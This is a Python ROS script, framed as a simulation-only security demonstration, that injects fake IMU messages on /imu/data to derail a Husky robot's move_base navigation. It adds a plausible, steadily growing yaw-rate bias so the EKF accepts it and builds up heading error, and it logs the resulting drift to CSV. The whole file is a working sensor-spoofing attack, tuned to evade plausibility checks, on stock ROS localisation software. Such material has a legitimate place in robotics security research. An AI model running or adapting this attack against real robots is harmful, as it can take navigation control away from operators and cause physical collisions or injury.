#!/usr/bin/env python3
"""TUNED IMU spoof that actually derails move_base navigation.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

NOT the report reproduction (that is attack_imu_faithful.py). This variant
exploits the ONE IMU channel the stock EKF integrates into pose:
husky_control/config/localization.yaml fuses IMU angular velocity with
imu0_differential: true, so a COHERENT, sustained yaw-rate bias is integrated
into a GROWING heading error. move_base tracks /odometry/filtered, so a corrupted
fused heading makes it steer to correct a phantom error and drive off the path.

Why coherent-and-plausible, not impossible: obvious garbage oscillates and
self-cancels under differential integration; a steady plausible bias accumulates.

MOUNTING CAVEAT (CLAUDE.md:78): imu_link is mounted rotated ~90 deg, so the axis
that maps to fused world-yaw rate is NOT the intuitive base_link z. INJECT_AXIS
and the bias/drift magnitudes are therefore TUNABLE CONSTANTS; the exact values
that produce a decisive derailment are an empirical one-run tuning step.

Wiring verified against the stock topology; NOT run live end-to-end here.
"""

import argparse
import csv
import math
import threading
import time

import rospy
from sensor_msgs.msg import Imu
from nav_msgs.msg import Odometry
from tf.transformations import euler_from_quaternion, quaternion_from_euler


# Tunables. Starting points from the EKF config; expect ONE tuning pass live.
YAW_RATE_BIAS = 0.6     # rad/s coherent bias on the injected yaw-rate axis
YAW_DRIFT = 0.02        # rad/s^2 slow additional drift so the lie keeps growing
INJECT_AXIS = "z"       # which angular_velocity axis carries the bias (mounting)
IMU_FRAME_ID = "base_link"


class ImuDerailAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._fused_xy_yaw = None   # (x, y, yaw) from /odometry/filtered
        self._baseline = None       # (x, y, yaw) captured pre-attack
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher onto the genuine IMU topic. queue_size=1: always the freshest
        # fake message, never a backlog.
        self._pub = rospy.Publisher("/imu/data", Imu, queue_size=1)

        # Telemetry subscriber. We only READ this; the attack is the publish.
        # /odometry/filtered is this stock robot's fused EKF output.
        rospy.Subscriber("/odometry/filtered", Odometry, self._on_fused,
                         queue_size=1)

        # CSV: open once, write header, flush every row so a mid-run Ctrl-C
        # still leaves a complete, readable file.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(["elapsed_time", "fused_x", "fused_y", "fused_yaw",
                            "d_from_baseline_m", "d_yaw_from_baseline_rad"])
        self._csv_file.flush()

    # --- telemetry callback --------------------------------------------------
    def _on_fused(self, msg):
        q = msg.pose.pose.orientation
        yaw = euler_from_quaternion([q.x, q.y, q.z, q.w])[2]
        with self._lock:
            self._fused_xy_yaw = (msg.pose.pose.position.x,
                                  msg.pose.pose.position.y, yaw)

    # --- the fabricated message ---------------------------------------------
    def _build_spoof(self, t):
        """Coherent yaw-rate bias (+ slow drift), integrated orientation kept
        consistent with it. Plausible magnitudes so the EKF trusts and integrates
        the lie rather than rejecting it."""
        rate = self.args.bias + self.args.drift * t   # instantaneous injected yaw-rate, rad/s
        yaw = self.args.bias * t + 0.5 * self.args.drift * t * t  # exact integral of rate(tau) over [0,t]
        msg = Imu()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = IMU_FRAME_ID
        q = quaternion_from_euler(0.0, 0.0, yaw)
        msg.orientation.x, msg.orientation.y = q[0], q[1]
        msg.orientation.z, msg.orientation.w = q[2], q[3]
        ax = {"x": 0, "y": 1, "z": 2}[self.args.axis]
        av = [0.0, 0.0, 0.0]
        av[ax] = rate
        msg.angular_velocity.x, msg.angular_velocity.y, msg.angular_velocity.z = av
        for cov in (msg.orientation_covariance, msg.angular_velocity_covariance,
                    msg.linear_acceleration_covariance):
            cov[0] = cov[4] = cov[8] = 0.01
        return msg

    # --- telemetry row -------------------------------------------------------
    def _log_row(self):
        with self._lock:
            cur = self._fused_xy_yaw
            base = self._baseline
        elapsed = time.time() - self._start_wall
        if cur is None:
            rospy.loginfo("[t=%6.1fs] waiting for /odometry/filtered ...", elapsed)
            return
        if base is None:
            with self._lock:
                self._baseline = cur
                base = cur
        d = math.hypot(cur[0] - base[0], cur[1] - base[1])
        dyaw = cur[2] - base[2]
        rospy.loginfo("[t=%6.1fs] fused=(%.3f,%.3f,yaw=%.3f) d_base=%.3fm dyaw=%.3f",
                      elapsed, cur[0], cur[1], cur[2], d, dyaw)
        self._csv.writerow(["%.3f" % elapsed, "%.4f" % cur[0], "%.4f" % cur[1],
                            "%.4f" % cur[2], "%.4f" % d, "%.4f" % dyaw])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s

        rospy.loginfo(
            "ATTACK START (tuned coherent-bias derail): spoofing /imu/data at "
            "%.1f Hz with yaw-rate bias=%.3f rad/s, drift=%.3f rad/s^2 on axis "
            "'%s'%s",
            self.args.rate, self.args.bias, self.args.drift, self.args.axis,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")

        while not self._stop.is_set() and not rospy.is_shutdown():
            elapsed = time.time() - self._start_wall
            if self.args.duration > 0 and elapsed >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            self._pub.publish(self._build_spoof(elapsed))

            now = time.time()
            if now >= next_log:
                self._log_row()
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing and close the CSV. Idempotent. NO corrective
        message is sent -- we just cease publishing and let the genuine hector
        IMU stream reassert itself."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Tuned coherent yaw-rate bias IMU spoof that derails "
                    "move_base navigation by corrupting the EKF's fused "
                    "heading (differential IMU angular-velocity fusion).")
    p.add_argument("--rate", type=float, default=200.0,
                   help="publish rate in Hz (default 200; well above the "
                        "genuine 50 Hz hector IMU plugin)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to run; 0 = until Ctrl-C (default 0)")
    p.add_argument("--csv", default="attack_imu_derail.csv",
                   help="telemetry output CSV path "
                        "(default attack_imu_derail.csv)")
    p.add_argument("--bias", type=float, default=YAW_RATE_BIAS,
                   help="coherent yaw-rate bias in rad/s "
                        "(default %.2f; empirical tuning knob)" % YAW_RATE_BIAS)
    p.add_argument("--drift", type=float, default=YAW_DRIFT,
                   help="slow yaw-rate drift in rad/s^2 so the lie keeps "
                        "growing (default %.3f)" % YAW_DRIFT)
    p.add_argument("--axis", default=INJECT_AXIS, choices=["x", "y", "z"],
                   help="angular_velocity axis carrying the bias "
                        "(default %s; the ~90 deg imu_link mounting may put the "
                        "effective yaw axis on x or y)" % INJECT_AXIS)
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_imu_derail", anonymous=True)

    attack = ImuDerailAttack(args)
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
